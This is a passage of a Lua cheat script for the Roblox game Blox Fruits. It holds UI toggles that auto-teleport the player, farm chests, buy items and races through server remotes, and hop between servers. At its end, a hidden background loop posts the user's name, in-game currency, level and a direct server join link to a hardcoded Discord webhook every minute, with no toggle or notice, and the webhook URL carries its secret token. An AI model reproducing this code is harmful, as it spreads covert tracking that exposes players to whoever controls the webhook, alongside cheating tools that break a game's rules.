                            replicated.Remotes.CommF_:InvokeServer('BuyBoat', _G.SelectedBoat)
                        end
                    else
                        if plr.Character.Humanoid.Sit == false then
                            local bp = bo.VehicleSeat.CFrame * CFrame.new(0, 1, 0)
                            _tp(bp)
                        else
                            repeat
                                wait()
                                local bp = CFrame.new(- 1E7, 31, 37016.25)
                                if CheckEnemiesBoat() or CheckTerrorShark() or CheckPirateGrandBrigade() then
                                    _tp(CFrame.new(- 1E7, 150, 37016.25))
                                else
                                    _tp(CFrame.new(- 1E7, BoatY, 37016.25))
                                end
                            until not _G.FindMirage or (bp.Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 10 or workspace._WorldOrigin.Locations:FindFirstChild('Mirage Island') or plr.Character.Humanoid.Sit == false
                            plr.Character.Humanoid.Sit = false
                        end
                    end
                else
                    _tp(workspace.Map.MysticIsland.Center.CFrame * CFrame.new(0, 300, 0))
                end
            end)
        end
    end
end)





SeaDownRightSection:Toggle({
    Name = "Auto Tween Highest Point Mirage ", 
    Flag = "TweenHighest",
    Default = false,
    Callback = function(state)
        _G.HighestMirage = state
    end
})

spawn(function()
    while wait(Sec) do
        if _G.HighestMirage then
            pcall(function()
                if workspace._WorldOrigin.Locations:FindFirstChild('Mirage Island', true) then
                    _tp(workspace.Map.MysticIsland.Center.CFrame * CFrame.new(0, 400, 0))
                end
            end)
        end
    end
end)

SeaDownRightSection:Toggle({
    Name = "Auto Collect Gear", 
    Flag = "CollectGear",
    Default = false,
    Callback = function(state)
        _G.TPGEAR = state
    end
})

spawn(function()
    pcall(function()
        while wait(0.1) do
            if _G.TPGEAR then
                for bq, br in pairs(workspace.Map:FindFirstChild('MysticIsland'):GetChildren()) do
                    if br.Name == 'Part' then
                        if br.ClassName == 'MeshPart' then
                            _tp(br.CFrame)
                        end
                    end
                end
            end
        end
    end)
end)

SeaDownRightSection:Toggle({
    Name = "Auto Tween Advance Fruit Dealer", 
    Flag = "AdvanceDeal",
    Default = false,
    Callback = function(state)
        _G.Addealer = state
    end
})

spawn(function()
    while wait() do
        if _G.Addealer then
            pcall(function()
                if workspace._WorldOrigin.Locations:FindFirstChild('Mirage Island', true) then
                    for bs, bt in pairs(replicated.NPCs:GetChildren()) do
                        if bt.Name == 'Advanced Fruit Dealer' then
                            _tp(bt.HumanoidRootPart.CFrame)
                        end
                    end
                end
            end)
        end
    end
end)

SeaDownRightSection:Toggle({
    Name = "Auto Collect Mirage Chest", 
    Flag = "MirageChest",
    Default = false,
    Callback = function(state)
        _G.FarmChestM = state
    end
})

spawn(function()
    while wait(0.2) do
        if _G.FarmChestM then
            pcall(function()
                if workspace.Map.MysticIsland.Chests:FindFirstChild('DiamondChest') or workspace.Map.MysticIsland.Chests:FindFirstChild('FragChest') then
                    local bt = game:GetService('CollectionService')
                    local bu = game:GetService('Players')
                    local bv = bu.LocalPlayer
                    local bw = bv.Character or bv.CharacterAdded:Wait()
                    if not bw then
                        return
                    end
                    local bx = bw:GetPivot().Position
                    local by = bt:GetTagged('_ChestTagged')
                    local bz, bA = math.huge, nil
                    for bB = 1, # by do
                        local bC = by[bB]
                        local bD = (bC:GetPivot().Position - bx).Magnitude
                        if not SelectedIsland or bC:IsDescendantOf(SelectedIsland) then
                            if not bC:GetAttribute('IsDisabled') and bD < bz then
                                bz = bD
                                bA = bC
                            end
                        end
                    end
                    if bA then
                        _tp(bA:GetPivot())
                    end
                end
            end)
        end
    end
end)


local Misc = Library:Tab({ 

    Name = "Melee & Stats" 

})

local MiscLeftSection = Misc:Section({ 

    Name = "Shop", 

    Side = "Left" 
})




MiscLeftSection:Button({
    Name = 'Buy Legendary Sword',
    Callback = function()
        replicated.Remotes.CommF_:InvokeServer('LegendarySwordDealer', '1')
        replicated.Remotes.CommF_:InvokeServer('LegendarySwordDealer', '2')
        replicated.Remotes.CommF_:InvokeServer('LegendarySwordDealer', '3')
    end
})
MiscLeftSection:Button({
    Name = 'Buy True Triple Katana Sword',
    Description = '',
    Callback = function()
        replicated.Remotes.CommF_:InvokeServer('MysteriousMan', '2')
    end
})

MiscLeftSection:Button({
    Name = "Black Leg",
    Callback = function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBlackLeg")
    end
})

MiscLeftSection:Button({
    Name = "Electro",
    Callback = function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectro")
    end
})

MiscLeftSection:Button({
    Name = "Fishman Karate",
    Callback = function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyFishmanKarate")
    end
})

MiscLeftSection:Button({
    Name = "Dragon Claw",
    Callback = function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "1")
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "2")
    end
})

MiscLeftSection:Button({
    Name = "Superhuman",
    Callback = function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySuperhuman")
    end
})

MiscLeftSection:Button({
    Name = "Death Step",
    Callback = function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDeathStep")
    end
})

MiscLeftSection:Button({
    Name = "Sharkman Karate",
    Callback = function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate", true)
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate")
    end
})


MiscLeftSection:Button({
    Name = "Electric Claw",
    Callback = function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectricClaw")
    end
})


local MiscRightSection = Misc:Section({ 

    Name = "Shop", 

    Side = "Right" 
})



MiscRightSection:Button({
    Name = "Dragon Talon",
    Callback = function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDragonTalon")
    end
})

MiscRightSection:Button({
    Name = "Godhuman",
    Callback = function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyGodhuman")
    end
})

MiscRightSection:Button({
    Name = "Sanguine Art",
    Callback = function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySanguineArt")
    end
})



MiscRightSection:Button({

Name = "Resets Stats",

Description = "",

Callback = function()

game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward", "Refund", "1");

game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward", "Refund", "2");

end

})

MiscRightSection:Button({
    Name = "Roll Race",
    Callback = function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward", "Reroll", "1")
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward", "Reroll", "2")
    end
})

MiscRightSection:Button({
    Name = "Change To Ghoul Race",
    Callback = function()
        local args = {
            [1] = "Ectoplasm",
            [2] = "Change",
            [3] = 4
        }
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    end
})

MiscRightSection:Button({
    Name = "Change To Cyborg Race",
    Callback = function()
        local args = {
            [1] = "CyborgTrainer",
            [2] = "Buy"
        }
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    end
})

MiscRightSection:Button({
    Name = "Change To Draco Race",
    Callback = function()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(5661.5322265625, 1013.0907592773438, -334.9649963378906))
        Tween2(CFrame.new(5814.42724609375, 1208.3267822265625, 884.5785522460938))
        local target = Vector3.new(5814.42724609375, 1208.3267822265625, 884.5785522460938)
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        repeat wait() until (character.HumanoidRootPart.Position - target).Magnitude < 1
        local args = {
            [1] = {
                NPC = "Dragon Wizard",
                Command = "DragonRace"
            }
        }
        game:GetService("ReplicatedStorage").Modules.Net:FindFirstChild("RF/InteractDragonQuest"):InvokeServer(unpack(args))
    end
})



local Server = Library:Tab({ 

    Name = "Misc / Server" 

})

local ServerLeftSection = Server:Section({ 

    Name = "Server", 

    Side = "Left" 
})





ServerLeftSection:Textbox({
     Name = "Input Job Id",
     Default = "",
     PlaceholderText = "Paste Job Id",
     Flag = "JobId",
     Callback = function(Value)
         getgenv().Job = Value
     end
})    

local lastTeleportTime = 0
local teleportCooldown = 5
ServerLeftSection:Button({
    Name = "Join Server",
    Callback = function()
        if tick() - lastTeleportTime >= teleportCooldown then
            lastTeleportTime = tick()
            game:GetService("TeleportService"):TeleportToPlaceInstance(game.placeId, getgenv().Job, game.Players.LocalPlayer)        
        end
    end
})
local lastCopyTime = 0
local copyCooldown = 2
ServerLeftSection:Button({
    Name = "Copy JobId",
    Callback = function()
        if tick() - lastCopyTime >= copyCooldown then
            lastCopyTime = tick()
            setclipboard(tostring(game.JobId))
            print("JobId Copied!")
        else
            print("Please try again in a moment!")
        end
    end
})
local lastTeleportTime = 0
local teleportCooldown = 3
ServerLeftSection:Button({
    Name = "Rejoin Server",
    Callback = function()
        if tick() - lastTeleportTime >= teleportCooldown then
            lastTeleportTime = tick()
            game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)        
        end
    end
})
ServerLeftSection:Button({
	  Name = "Hop Server",
	  Callback = function()
          Hop()
      end
})
function Hop()
    local PlaceID = game.PlaceId
    local AllIDs = {}
    local foundAnything = ""
    local actualHour = os.date("!*t").hour
    local Deleted = false
    function TPReturner()
        local Site;
        if foundAnything == "" then
            Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
        else
            Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
        end        
        local ID = ""
        if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
            foundAnything = Site.nextPageCursor
        end        
        local num = 0
        for i,v in pairs(Site.data) do
            local Possible = true
            ID = tostring(v.id)            
            if tonumber(v.maxPlayers) > tonumber(v.playing) then
                for _,Existing in pairs(AllIDs) do
                    if num ~= 0 then
                        if ID == tostring(Existing) then
                            Possible = false
                        end
                    else
                        if tonumber(actualHour) ~= tonumber(Existing) then
                            local delFile = pcall(function()
                                AllIDs = {}
                                table.insert(AllIDs, actualHour)
                            end)
                        end
                    end
                    num = num + 1
                end
                if Possible == true then
                    table.insert(AllIDs, ID)
                    wait(0.1)
                    pcall(function()
                        game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
                    end)
                    wait(1)
                    break
                end
            end
        end
    end
    function Teleport() 
        while true do
            pcall(function()
                TPReturner()
                if foundAnything ~= "" then
                    TPReturner()
                end
            end)
            wait(2)
        end
    end
    Teleport()
end


local ServerRightSection = Server:Section({ 

    Name = "Misc / Status", 

    Side = "Right" 
})




ServerRightSection:Toggle({
    Name = "Turn on Full Bright",
    Flag = "Bright",
    Default = false,
    Callback = function(ch)
        bright = ch
        if ch then
            Lighting.Ambient = Color3.new(1, 1, 1)
            Lighting.ColorShift_Bottom = Color3.new(1, 1, 1)
            Lighting.ColorShift_Top = Color3.new(1, 1, 1)
        else
            Lighting.Ambient = Color3.new(0, 0, 0)
            Lighting.ColorShift_Bottom = Color3.new(0, 0, 0)
            Lighting.ColorShift_Top = Color3.new(0, 0, 0)
        end
    end
})




ServerRightSection:Button({
    Name = "Remove Sky Fog",
    Callback = function()
        local Lighting = game:GetService("Lighting")
        if Lighting:FindFirstChild("LightingLayers") then
            Lighting.LightingLayers:Destroy()
        end
        if Lighting:FindFirstChild("SeaTerrorCC") then
            Lighting.SeaTerrorCC:Destroy()
        end
        if Lighting:FindFirstChild("FantasySky") then
            Lighting.FantasySky:Destroy()
        end
    end
})




-- webhook Kid
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- VARIABLES
local requestt = http_request or request or syn.request
local disconnected = false

-- FUNCTION TO FORMAT BIG NUMBERS
local function formatNumber(n)
    local suffixes = {"", "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "Dc"}
    local i = 1
    while n >= 1000 and i < #suffixes do
        n = n / 1000
        i = i + 1
    end
    return string.format("%.2f%s", n, suffixes[i])
end

-- FUNCTION TO SEND WEBHOOK
local function sendWebhook(beliAmount, level)
    local displayName = LocalPlayer.DisplayName or "User"
    local fakeUser = displayName .. " // " .. tostring(math.random(1000, 9999))
    local playerCount = #Players:GetPlayers()

    local data = {
        ["embeds"] = {{
            ["title"] = "Blox Fruits Server Notify",
            ["type"] = "rich",
            ["color"] = tonumber("00ff00", 16), -- Green color
            ["image"] = {
                ["url"] = "https://cdn.discordapp.com/attachments/1351885690048221255/1364438601303064628/standard_1.gif"
            },
            ["fields"] = {
                {["name"] = 'Fake User', ["value"] = "```" .. fakeUser .. "```", ["inline"] = true},
                {["name"] = 'Beli', ["value"] = "```"..formatNumber(beliAmount).."```", ["inline"] = true},
                {["name"] = 'Level', ["value"] = "```"..level.."```", ["inline"] = true},
                {["name"] = 'Server Players', ["value"] = "```"..playerCount.."```", ["inline"] = true},
                {["name"] = 'Game Link', ["value"] = "[Click Here](https://www.roblox.com/games/"..game.PlaceId..")", ["inline"] = true},
                {["name"] = "Server Link", ["value"] = "```roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. "```", ["inline"] = true }
            }
        }}
    }

    local jsonData = HttpService:JSONEncode(data)
    pcall(function()
        requestt({
            Url = 'https://discord.com/api/webhooks/1376115882304208987/ZDe-ZbATQUjg2U85KJPJxHyPYuWyTmD5cE7UeWEHtluSe8AUX56MdpzU_a0UZyQkRKln',  -- Replace with your actual webhook URL
            Body = jsonData,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"}
        })
    end)
end

-- MONITOR Beli AND LEVEL
task.spawn(function()
    while not disconnected do
        task.wait(60)  -- Wait 60 seconds before sending the webhook again

        local stats = LocalPlayer:FindFirstChild("Data")
        if stats then
            local beli = stats:FindFirstChild("Beli") and stats.Beli.Value or 0
            local level = stats:FindFirstChild("Level") and stats.Level.Value or 0
            sendWebhook(beli, level)
        end
    end
end)